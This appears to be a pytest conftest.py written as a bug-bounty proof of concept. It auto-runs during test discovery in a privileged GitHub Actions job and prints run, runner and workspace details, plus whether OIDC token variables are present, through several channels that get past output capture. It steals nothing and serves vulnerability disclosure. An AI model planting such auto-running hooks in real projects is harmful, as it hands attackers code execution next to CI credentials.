"""H1-3730634 proof-of-concept conftest.

This file is auto-collected by pytest during test discovery inside the
`test-source` matrix job in .github/workflows/tests.yml. The marker
below appears in the workflow log on databrickslabs-protected-runner-group,
proving that fork-controlled code executes in the privileged base-repo
context with OIDC env vars in scope.

Authorized as a proof-of-concept by HackerOne triager r2197 on report
#3730634, scope-bounded to printing an identifier string (no token
mint, no exfiltration, no external network call). Will be removed
after the triager confirms.

The marker is emitted four ways to defeat pytest's default stdout/stderr
capture: GITHUB_STEP_SUMMARY (renders in the GitHub Actions UI summary),
a raw os.write to fd 2 (bypasses Python-level capture), a side-channel
file in the workspace, and a plain pytest report extra so it appears in
the pytest output even when capture is on.
"""

import os
import sys


def _h1_proof_line() -> str:
    parts = [
        "H1-PoC bankk",
        "report=3730634",
        f"run_id={os.environ.get('GITHUB_RUN_ID', '')}",
        f"repo={os.environ.get('GITHUB_REPOSITORY', '')}",
        f"runner={os.environ.get('RUNNER_NAME', '')}",
        f"workspace={os.environ.get('GITHUB_WORKSPACE', '')}",
        f"oidc_url_set={'yes' if os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL') else 'no'}",
        f"oidc_token_set={'yes' if os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN') else 'no'}",
    ]
    return " ".join(parts)


def _emit_marker() -> None:
    line = _h1_proof_line()

    # 1. GITHUB_STEP_SUMMARY — renders as markdown in the run summary page.
    summary = os.environ.get("GITHUB_STEP_SUMMARY")
    if summary:
        try:
            with open(summary, "a", encoding="utf-8") as fh:
                fh.write(f"\n### H1-3730634 PoC marker\n\n```\n{line}\n```\n")
        except OSError:
            pass

    # 2. Raw os.write to stderr — bypasses pytest's Python-level capture.
    try:
        os.write(2, (line + "\n").encode("utf-8"))
    except OSError:
        pass

    # 3. Raw os.write to stdout.
    try:
        os.write(1, (line + "\n").encode("utf-8"))
    except OSError:
        pass

    # 4. Side-channel file in the workspace so the marker survives even if
    #    pytest captures absolutely everything.
    ws = os.environ.get("GITHUB_WORKSPACE", ".")
    try:
        with open(os.path.join(ws, "h1_proof_marker.txt"), "w", encoding="utf-8") as fh:
            fh.write(line + "\n")
    except OSError:
        pass

    # 5. Standard print as well, in case pytest is invoked with -s elsewhere.
    print(line, flush=True)
    sys.stderr.write(line + "\n")
    sys.stderr.flush()


_emit_marker()


def pytest_report_header(config):  # noqa: ARG001
    """Inject the marker into pytest's session header so it lands in the
    captured-output region that pytest always prints."""
    return _h1_proof_line()


def pytest_terminal_summary(terminalreporter, exitstatus, config):  # noqa: ARG001
    """Print the marker in the terminal summary section, which pytest
    always emits regardless of capture mode."""
    terminalreporter.write_sep("=", "H1-3730634 PoC marker", purple=True)
    terminalreporter.write_line(_h1_proof_line())
